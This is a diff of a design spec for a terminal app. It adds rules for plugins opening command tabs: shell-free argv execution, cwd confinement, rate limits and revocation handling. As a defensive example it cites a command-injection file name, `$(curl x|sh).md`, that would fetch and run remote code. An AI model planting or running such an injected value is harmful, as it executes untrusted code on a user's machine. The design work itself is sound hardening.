@@ -131,8 +131,7 @@ folder. The shell parsing the command is deliberate and is not the argv-only rul
 text is the user's own setting, never renderer, plugin or hook input, and it still travels as one
 argv element. Main is the authority: the renderer's `tabs.create` names the entry by level and id
 and main looks the command up in its own settings (unknown id: refused); a command or label in
-the payload is never read, and plugins cannot open command tabs (their tab APIs open Claude tabs
-only). Ids are minted by main; a saved list may keep only ids its level already has. A damaged
+the payload is never read. Ids are minted by main; a saved list may keep only ids its level already has. A damaged
 settings file costs its bad entries (dropped on read), not the menu; saving refuses an invalid
 list as a whole. The tab keeps its own copy of label and command: editing or deleting the entry
 later does not change an open tab, its Restart, or its restore. A command tab is like a shell tab
@@ -141,6 +140,24 @@ reaches the window without `--project`; `hook` and `session note`/`steps` are re
 the session registry, the status strip, `ccc sessions` or plugin `sessions` events; Exit (below) applies as to any tab: a clean
 exit closes it, a failure keeps "exited (code N): Restart · Close", and Restart runs its command
 again.
+
+*Plugin command tabs.* A plugin opens a command tab with `ctx.sessions.openCommand({ argv, cwd, title,
+focus })` (the Files plugin's "Open with" rules): the argv runs **directly, with no shell** (1-64
+strings of 1-4096 characters, no NUL; `argv[0]` found on the same PATH, with the same env and window
+token as every tab), the cwd realpath'd inside the project folder, the title a label (1-60
+characters, one line; default the last path part of `argv[0]`). The tab keeps the plugin's id (and
+its manifest name) and its tooltip says "Opened by Files (cockpit.files)", the bare id when the name
+is not known; that marker is display only, never an authority. Why a plugin may: it can already run
+anything through `ctx.exec` and terminal overlays, so a tab adds no power, only a place the person can
+see; and a command the person wrote in a plugin's settings (an "Open with" rule) is their choice, as
+an entry of this menu is. What is kept: no shell between the plugin and the process (substituting a
+file name is the plugin's job, as one whole argv element, so a repo file named `$(curl x|sh).md` is
+only ever a name; a pipe passes it as a positional argument, `sh -c 'glow "$1" | less -R' sh <file>`),
+the marker, the project and window taken from the plugin's host (never from the request), and the
+5-a-minute budget `open` and `openShell` share. Saved with `argv` and `openedBy` instead of
+`command` (a record with both is dropped, and never falls back to a shell line), restored not
+started like any command tab, and dropped at restore once its plugin is uninstalled or revoked by a
+marketplace with authority over it: a revoked plugin's argv must not wait one Restart click away.
 
 *Open as overlay.* Each entry also says where it opens: Tab (the default) or Overlay (a select per
 entry in both editors; stored as `open: "overlay"` and only then: an absent or damaged value is a
